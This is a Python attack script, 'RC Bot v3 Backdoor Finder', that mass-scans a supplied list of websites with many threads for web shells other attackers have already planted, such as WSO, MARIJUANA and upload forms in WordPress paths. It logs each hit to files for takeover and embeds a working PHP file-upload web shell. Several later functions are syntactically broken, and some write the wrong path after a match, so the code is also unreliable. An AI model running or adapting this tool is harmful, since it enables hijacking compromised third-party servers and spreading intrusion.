# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA


print """
                  .------------
                 /             /
                |              |
                |,  .-.  .-.  ,|
                | )(@_/  \@_)( |
                |/     /\     \|
      (@_       (_     ^^     _)
 _     ) \_______\__|IIIIII|__/_________________________
(_)@8@8>>________|-\IIIIII/-|___________________________>
       )_/        \          /
      (@           `--------`
                  RC Bot v3
         DM   https://t.me/R3dC0d3r1337
         TG Group   https://t.me/RCINFOTECH
                Toolie : Backdoor Finder
        ]-------------------------------------[
"""
shell = """<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/.well-known/acme-challenge/index.php',headers=headers, allow_redirects=True,timeout=15)
        if '>Upload: <input type="hidden" value="100000000" name="MAX_FILE_SIZE"><input type="file" name="upfile" id="ltb">' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('index-shells.txt', 'a').write(url + '/.well-known/acme-challenge/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/.well-known/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('MARIJUANA.txt', 'a').write(url + '/.well-known/index.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(100)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cong.php',headers=headers, allow_redirects=True,timeout=15)
        if 'Mr.Combet WebShell' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('cong-Shells.txt', 'a').write(url + '/cong.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/st.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Uname:' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('wso-Shells.txt', 'a').write(url + '/st.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/css/index.php',headers=headers, allow_redirects=True,timeout=15)
        if 'L I E R SHELL' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('ex-Shells.txt', 'a').write(url + '/css/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'BlackDragon' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('re-Shells.txt', 'a').write(url + '/radio.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(100)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/Requests/Text/index.php',headers=headers, allow_redirects=True,timeout=15)
        if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('MARIJuANA-shells.txt', 'a').write(url + '/wp-includes/Requests/Text/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/Requests/Text/admin.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Shell Bypass 403 GE-C666C' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('Shell-Bypass.txt', 'a').write(url + '/wp-includes/Requests/Text/admin.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(100)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/.well-known/acme-challenge/license.php',headers=headers, allow_redirects=True,timeout=15)
        if 'class="form-control" placeholder="@Passwrd" type="password" name="getpwd"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('license-Shells.txt', 'a').write(url + '/.well-known/acme-challenge/license.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cjfuns.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Doc Root:' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('cjfuns-Shells.txt', 'a').write(url + '/cjfuns.php')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/background-image-cropper/ups.php',headers=headers, allow_redirects=True,timeout=15)
        if 'enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/background-image-cropper/ups.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/background-image-cropper/ups.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/background-image-cropper/ups.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/dropdown.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if "-rw-r--r--" in check.content.decode(
            "utf-8"
        ):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(
                url + "/dropdown.php\n"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/dropdown.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if (
                "-rw-r--r--"
                in check.content.decode("utf-8")
            ):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(
                    url + "/dropdown.php\n"
                )
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/dropdown.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if "-rw-r--r--" in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-admin/dropdown.php\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/dropdown.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if "-rw-r--r--" in check.content.decode(
                "utf-8"
            ):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(
                    url + "/wp-admin/dropdown.php\n"
                )
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/Cache/dropdown.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if (
            "-rw-r--r--"
            in check.content.decode("utf-8")
        ):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-content/plugins/Cache/dropdown.php\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/plugins/Cache/dropdown.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if (
                "-rw-r--r--"
                in check.content.decode("utf-8")
            ):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(
                    url + "/wp-content/plugins/Cache/dropdown.php\n"
                )
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/dropdown.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if "-rw-r--r--" in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-content/dropdown.php\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/dropdown.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if "-rw-r--r--" in check.content.decode("utf-8"):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(url + "/shell20211028.php\n")
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/js/tinymce/plugins/compat3x/css/index.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if (
            "-rw-r--r--"
            in check.content.decode("utf-8")
        ):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-includes/js/tinymce/plugins/compat3x/css/index.php\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/js/tinymce/plugins/compat3x/css/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if (
                "-rw-r--r--"
                in check.content.decode("utf-8")
            ):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(
                    url + "/wp-includes/js/tinymce/plugins/compat3x/css/index.php\n"
                )
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/cjfuns.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if "Doc Root:" in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(
                url + "/cjfuns.php\n"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/cjfuns.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if "Doc Root:" in check.content.decode("utf-8"):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(
                    url + "/cjfuns.php\n"
                )
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/cache/indexx.php", headers=headers, allow_redirects=True, timeout=7
        )
        if 'input type="file" name="upfile" id="ltb"> <input type="submit" value="Go"'in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/cache/indexx.php\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/cache/indexx.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if 'input type="file" name="upfile" id="ltb"> <input type="submit" value="Go"' in check.content.decode("utf-8"):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(url + "/cache/indexx.php\n")
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/js/tinymce/skins/lightgray/img/index.php?p=", headers=headers, allow_redirects=True, timeout=7
        )
        if 'a title="Upload" class="nav-link" href="?p=&amp;upload"' in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-includes/js/tinymce/skins/lightgray/img/index.php?p=\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/js/tinymce/skins/lightgray/img/index.php?p=",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if 'a title="Upload" class="nav-link" href="?p=&amp;upload"' in check.content.decode("utf-8"):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(url + "/wp-includes/js/tinymce/skins/lightgray/img/index.php?p=\n")
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/themes/twentyseventeen/page/index.php?p=",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if 'a title="Upload" class="nav-link" href="?p=&amp;upload"' in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-content/themes/twentyseventeen/page/index.php?p=\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/themes/twentyseventeen/page/index.php?p=",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if 'a title="Upload" class="nav-link" href="?p=&amp;upload"' in check.content.decode("utf-8"):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(url + "/wp-content/themes/twentyseventeen/page/index.php?p=\n")
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/blocks/table/int/tmpl/index.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if 'upload=gaskan">Upload File<' in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-includes/blocks/table/int/tmpl/index.php\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/blocks/table/int/tmpl/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if 'upload=gaskan">Upload File<' in check.content.decode("utf-8"):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(url + "/wp-includes/blocks/table/int/tmpl/index.php\n")
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/cgi-bin/cloud.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if 'upload=gaskan">Upload File<' in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-includes/blocks/table/int/tmpl/index.php\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/blocks/table/int/tmpl/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if 'upload=gaskan">Upload File<' in check.content.decode("utf-8"):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(url + "/wp-includes/blocks/table/int/tmpl/index.php\n")
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

def FourHundredThree(url):
    try:
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/cgi-bin/cloud.php",
            headers=headers,
            allow_redirects=True,
            timeout=7,
        )
        if 'upload=gaskan">Upload File<' in check.content.decode("utf-8"):
            print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
            
            open("Shells.txt", "a").write(url + "/wp-includes/blocks/table/int/tmpl/index.php\n")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/blocks/table/int/tmpl/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=7,
            )
            if 'upload=gaskan">Upload File<' in check.content.decode("utf-8"):
                print("\033[0;32m[X]" + url + " --> {}[Found]".format(fg))
                
                open("Shells.txt", "a").write(url + "/wp-includes/blocks/table/int/tmpl/index.php\n")
            else:
                print("[X]" + url + " --> {}[Not Vuln]".format(fr))

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

print '\n [!] {}Saved in Shells.txt'.format(fc)
